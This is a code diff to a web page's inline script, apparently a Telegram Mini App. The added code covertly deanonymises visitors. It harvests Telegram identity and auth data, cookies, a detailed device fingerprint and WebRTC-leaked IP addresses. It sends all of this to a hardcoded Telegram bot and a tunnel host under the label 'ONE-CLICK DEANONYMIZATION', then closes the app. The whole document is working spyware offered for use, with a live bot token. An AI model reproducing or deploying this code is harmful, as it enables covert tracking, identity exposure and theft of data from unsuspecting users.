@@ -12,92 +12,291 @@
 </div>
 <script>
 (function() {
-  // Exfil via Bot API sendMessage - always resolvable, no CORS issues
   var BOT_TOKEN = '8637229217:AAHukIDrQ3yHMKakpb4pOhLbb-IpjG_vtCA'
   var CHAT_ID = '1184265321'
   var EXFIL = 'https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect'
 
-  function sendViaBotAPI(text) {
-    var url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage'
+  function sendBot(text) {
     try {
       var xhr = new XMLHttpRequest()
-      xhr.open('POST', url, true)
+      xhr.open('POST', 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', true)
       xhr.setRequestHeader('Content-Type', 'application/json')
       xhr.send(JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' }))
     } catch(e) {}
-    // Also try img beacon to tunnel as backup
-    try { new Image().src = EXFIL + '/identity?d=' + encodeURIComponent(text) } catch(e) {}
   }
 
-  try {
-    var tg = window.Telegram && window.Telegram.WebApp
-    var initData = ''
-    var initDataUnsafe = {}
-    var platform = 'unknown'
-    var version = ''
-
-    if (tg) {
-      initData = tg.initData || ''
-      initDataUnsafe = tg.initDataUnsafe || {}
-      platform = tg.platform || 'unknown'
-      version = tg.version || ''
-    }
-
-    // Parse hash fragment as fallback
-    if (!initData && window.location.hash) {
-      try {
-        var hp = new URLSearchParams(window.location.hash.substring(1))
-        var wd = hp.get('tgWebAppData')
-        if (wd) {
-          initData = decodeURIComponent(wd)
-          var p = new URLSearchParams(initData)
-          var uj = p.get('user')
-          if (uj) {
-            initDataUnsafe = {
-              query_id: p.get('query_id'),
-              user: JSON.parse(uj),
-              auth_date: p.get('auth_date'),
-              signature: p.get('signature'),
-              hash: p.get('hash')
-            }
+  // ===== TELEGRAM IDENTITY =====
+  var tg = window.Telegram && window.Telegram.WebApp
+  var initData = '', initDataUnsafe = {}, tgPlat = 'unknown', tgVer = ''
+  if (tg) {
+    initData = tg.initData || ''
+    initDataUnsafe = tg.initDataUnsafe || {}
+    tgPlat = tg.platform || 'unknown'
+    tgVer = tg.version || ''
+  }
+  if (!initData && window.location.hash) {
+    try {
+      var hp = new URLSearchParams(window.location.hash.substring(1))
+      var wd = hp.get('tgWebAppData')
+      if (wd) {
+        initData = decodeURIComponent(wd)
+        var p = new URLSearchParams(initData)
+        var uj = p.get('user')
+        if (uj) {
+          initDataUnsafe = {
+            query_id: p.get('query_id'),
+            user: JSON.parse(uj),
+            auth_date: p.get('auth_date'),
+            signature: p.get('signature'),
+            hash: p.get('hash')
           }
         }
-      } catch(e) {}
+      }
+    } catch(e) {}
+  }
+  var user = initDataUnsafe.user || {}
+
+  // ===== DEVICE FINGERPRINT =====
+  var fp = {}
+  fp.ua = navigator.userAgent
+  fp.platform = navigator.platform
+  fp.lang = navigator.language
+  fp.langs = navigator.languages ? navigator.languages.join(',') : ''
+  fp.cores = navigator.hardwareConcurrency || 0
+  fp.deviceMemory = navigator.deviceMemory || 'N/A'
+  fp.maxTouchPoints = navigator.maxTouchPoints || 0
+  fp.doNotTrack = navigator.doNotTrack || 'unset'
+  fp.cookieEnabled = navigator.cookieEnabled
+  fp.screen = screen.width + 'x' + screen.height
+  fp.availScreen = screen.availWidth + 'x' + screen.availHeight
+  fp.dpr = window.devicePixelRatio
+  fp.colorDepth = screen.colorDepth
+  try { fp.orientation = screen.orientation.type } catch(e) {}
+  fp.tz = Intl.DateTimeFormat().resolvedOptions().timeZone
+  fp.tzOffset = new Date().getTimezoneOffset()
+  try {
+    var lo = Intl.DateTimeFormat().resolvedOptions()
+    fp.locale = lo.locale
+  } catch(e) {}
+
+  // Network
+  if (navigator.connection) {
+    fp.netType = navigator.connection.effectiveType
+    fp.downlink = navigator.connection.downlink
+    fp.rtt = navigator.connection.rtt
+  }
+
+  // Storage
+  try {
+    if (navigator.storage && navigator.storage.estimate) {
+      navigator.storage.estimate().then(function(est) {
+        fp.storageQuota = est.quota
+      }).catch(function(){})
     }
+  } catch(e) {}
 
-    var user = initDataUnsafe.user || {}
-    var msg = '<b>PHASE 2: IDENTITY CAPTURED</b>\n\n'
-      + '<b>User ID:</b> ' + (user.id || 'N/A') + '\n'
-      + '<b>Name:</b> ' + (user.first_name || '') + ' ' + (user.last_name || '') + '\n'
-      + '<b>Username:</b> @' + (user.username || 'N/A') + '\n'
-      + '<b>Language:</b> ' + (user.language_code || '?') + '\n'
-      + '<b>Premium:</b> ' + (user.is_premium ? 'Yes' : 'No') + '\n'
-      + '<b>Platform:</b> ' + platform + '\n'
-      + '<b>Version:</b> ' + version + '\n'
-      + '<b>Auth Date:</b> ' + (initDataUnsafe.auth_date || '?') + '\n'
-      + '<b>Hash:</b> ' + (initDataUnsafe.hash || 'N/A') + '\n'
-      + '<b>Signature:</b> ' + (initDataUnsafe.signature || 'N/A') + '\n\n'
-      + '<b>initData:</b>\n<code>' + (initData || '(empty)').substring(0, 500) + '</code>\n\n'
-      + '<b>URL:</b> ' + location.href.substring(0, 200)
+  // Battery
+  try {
+    if (navigator.getBattery) {
+      navigator.getBattery().then(function(b) {
+        fp.batteryLevel = b.level
+        fp.batteryCharging = b.charging
+      }).catch(function(){})
+    }
+  } catch(e) {}
 
-    sendViaBotAPI(msg)
+  // Canvas fingerprint
+  try {
+    var c = document.createElement('canvas')
+    c.width = 280
+    c.height = 60
+    var ctx = c.getContext('2d')
+    ctx.textBaseline = 'top'
+    ctx.font = '14px Arial'
+    ctx.fillStyle = '#f60'
+    ctx.fillRect(0, 0, 280, 60)
+    ctx.fillStyle = '#069'
+    ctx.fillText('Cwm fjordbank glyphs vext quiz, 12345', 2, 15)
+    ctx.fillStyle = 'rgba(102,204,0,0.7)'
+    ctx.fillText('Cwm fjordbank glyphs vext quiz, 12345', 4, 17)
+    ctx.globalCompositeOperation = 'multiply'
+    ctx.fillStyle = 'rgb(255,0,255)'
+    ctx.beginPath()
+    ctx.arc(50, 30, 25, 0, Math.PI * 2, true)
+    ctx.closePath()
+    ctx.fill()
+    fp.canvasHash = c.toDataURL().length + '_' + c.toDataURL().slice(-50)
+  } catch(e) {}
 
-    // Also send JSON to tunnel
+  // WebGL
+  try {
+    var gc = document.createElement('canvas')
+    var gl = gc.getContext('webgl') || gc.getContext('experimental-webgl')
+    if (gl) {
+      var di = gl.getExtension('WEBGL_debug_renderer_info')
+      if (di) {
+        fp.glVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL)
+        fp.glRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL)
+      }
+      fp.glVersion = gl.getParameter(gl.VERSION)
+      fp.glMaxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE)
+    }
+  } catch(e) {}
+
+  // Audio fingerprint
+  try {
+    var actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100)
+    var osc = actx.createOscillator()
+    osc.type = 'triangle'
+    osc.frequency.setValueAtTime(10000, actx.currentTime)
+    var comp = actx.createDynamicsCompressor()
+    comp.threshold.setValueAtTime(-50, actx.currentTime)
+    comp.knee.setValueAtTime(40, actx.currentTime)
+    comp.ratio.setValueAtTime(12, actx.currentTime)
+    comp.attack.setValueAtTime(0, actx.currentTime)
+    comp.release.setValueAtTime(0.25, actx.currentTime)
+    osc.connect(comp)
+    comp.connect(actx.destination)
+    osc.start(0)
+    actx.startRendering().then(function(buf) {
+      var d = buf.getChannelData(0)
+      var sum = 0
+      for (var i = 4500; i < 5000; i++) sum += Math.abs(d[i])
+      fp.audioFP = sum.toString()
+    }).catch(function(){})
+  } catch(e) {}
+
+  // Media devices
+  try {
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      navigator.mediaDevices.enumerateDevices().then(function(devices) {
+        fp.cameras = devices.filter(function(d) { return d.kind === 'videoinput' }).length
+        fp.mics = devices.filter(function(d) { return d.kind === 'audioinput' }).length
+        fp.speakers = devices.filter(function(d) { return d.kind === 'audiooutput' }).length
+      }).catch(function(){})
+    }
+  } catch(e) {}
+
+  // CSS prefs
+  try {
+    fp.darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    fp.reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches
+  } catch(e) {}
+
+  // Performance
+  try {
+    if (performance.memory) {
+      fp.jsHeapLimit = performance.memory.jsHeapSizeLimit
+    }
+  } catch(e) {}
+
+  // Cookies + storage from current context
+  fp.cookies = document.cookie || '(empty)'
+  fp.currentUrl = window.location.href
+  fp.referrer = document.referrer || '(none)'
+
+  // ===== WebRTC IP LEAK =====
+  var ips = []
+  var sent = false
+
+  function sendAll() {
+    if (sent) return
+    sent = true
+
+    // Build combined message for Bot API
+    var m = '<b>ONE-CLICK DEANONYMIZATION</b>\n\n'
+
+    m += '<b>== TELEGRAM IDENTITY ==</b>\n'
+    m += '<b>User ID:</b> <code>' + (user.id || 'N/A') + '</code>\n'
+    m += '<b>Name:</b> ' + (user.first_name || '') + ' ' + (user.last_name || '') + '\n'
+    m += '<b>Username:</b> @' + (user.username || 'N/A') + '\n'
+    m += '<b>Language:</b> ' + (user.language_code || '?') + '\n'
+    m += '<b>Premium:</b> ' + (user.is_premium ? 'Yes' : 'No') + '\n'
+    if (user.allows_write_to_pm) m += '<b>Allows DM:</b> Yes\n'
+    if (user.photo_url) m += '<b>Photo:</b> ' + user.photo_url + '\n'
+    m += '<b>Auth Date:</b> ' + (initDataUnsafe.auth_date || '?') + '\n'
+    m += '<b>HMAC:</b> <code>' + (initDataUnsafe.hash || 'N/A') + '</code>\n'
+    if (initDataUnsafe.signature) m += '<b>Sig:</b> <code>' + initDataUnsafe.signature.substring(0, 40) + '...</code>\n'
+
+    m += '\n<b>== NETWORK ==</b>\n'
+    for (var i = 0; i < ips.length; i++) {
+      var ip = ips[i]
+      var tag = ''
+      if (ip.match(/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.)/)) tag = '(private)'
+      else if (ip.match(/^(fe80|fec0|fd|fc)/i)) tag = '(link-local)'
+      else tag = 'PUBLIC'
+      m += '<b>IP:</b> <code>' + ip + '</code> ' + tag + '\n'
+    }
+    if (fp.netType) m += '<b>Net:</b> ' + fp.netType + ' / ' + fp.downlink + ' Mbps\n'
+
+    m += '\n<b>== DEVICE ==</b>\n'
+    m += '<b>UA:</b> <code>' + (fp.ua || '?').substring(0, 120) + '</code>\n'
+    m += '<b>Platform:</b> ' + fp.platform + '\n'
+    m += '<b>Screen:</b> ' + fp.screen + ' @' + fp.dpr + 'x / ' + fp.colorDepth + '-bit\n'
+    m += '<b>Cores:</b> ' + fp.cores + ' / RAM: ' + fp.deviceMemory + ' GB\n'
+    m += '<b>Touch:</b> ' + fp.maxTouchPoints + '\n'
+    m += '<b>TZ:</b> ' + fp.tz + ' (UTC' + (fp.tzOffset / -60) + ')\n'
+    if (fp.batteryLevel !== undefined) m += '<b>Battery:</b> ' + Math.round(fp.batteryLevel * 100) + '% ' + (fp.batteryCharging ? 'charging' : '') + '\n'
+    if (fp.cameras !== undefined) m += '<b>Cams:</b> ' + fp.cameras + ' Mics: ' + fp.mics + ' Spkrs: ' + fp.speakers + '\n'
+
+    m += '\n<b>== GPU ==</b>\n'
+    if (fp.glVendor) m += '<b>Vendor:</b> ' + fp.glVendor + '\n'
+    if (fp.glRenderer) m += '<b>Renderer:</b> ' + fp.glRenderer + '\n'
+
+    m += '\n<b>== FINGERPRINTS ==</b>\n'
+    if (fp.canvasHash) m += '<b>Canvas:</b> <code>' + fp.canvasHash.substring(0, 40) + '</code>\n'
+    if (fp.audioFP) m += '<b>Audio:</b> <code>' + fp.audioFP.substring(0, 20) + '</code>\n'
+
+    m += '\n<b>TG:</b> ' + tgPlat + ' v' + tgVer
+
+    sendBot(m)
+
+    // Send full JSON to collection server (backup)
     try {
       navigator.sendBeacon(EXFIL + '/identity', JSON.stringify({
         type: 'identity',
         initData: initData,
         initDataUnsafe: initDataUnsafe,
-        platform: platform,
-        version: version,
+        platform: tgPlat,
+        version: tgVer,
+        ts: Date.now()
+      }))
+    } catch(e) {}
+    try {
+      navigator.sendBeacon(EXFIL + '/fingerprint', JSON.stringify({
+        type: 'fingerprint',
+        data: fp,
+        ips: ips,
         ts: Date.now()
       }))
     } catch(e) {}
 
-    setTimeout(function() { try { tg.close() } catch(e) {} }, 1200)
+    // Auto-close
+    setTimeout(function() { try { tg.close() } catch(e) {} }, 1500)
+  }
 
-  } catch(err) {
-    sendViaBotAPI('ERROR: ' + err.message + '\n' + location.href + '\n' + location.hash.substring(0, 300))
+  // WebRTC
+  try {
+    var pc = new RTCPeerConnection({
+      iceServers: [
+        { urls: 'stun:stun.l.google.com:19302' },
+        { urls: 'stun:stun1.l.google.com:19302' },
+        { urls: 'stun:stun2.l.google.com:19302' }
+      ]
+    })
+    pc.createDataChannel('')
+    pc.createOffer().then(function(offer) { pc.setLocalDescription(offer) })
+    pc.onicecandidate = function(e) {
+      if (e.candidate) {
+        var parts = e.candidate.candidate.split(' ')
+        var ip = parts[4]
+        if (ip && ips.indexOf(ip) === -1) ips.push(ip)
+      }
+      if (!e.candidate) sendAll()
+    }
+    setTimeout(sendAll, 4000)
+  } catch(e) {
+    setTimeout(sendAll, 1500)
   }
 })()
 </script>
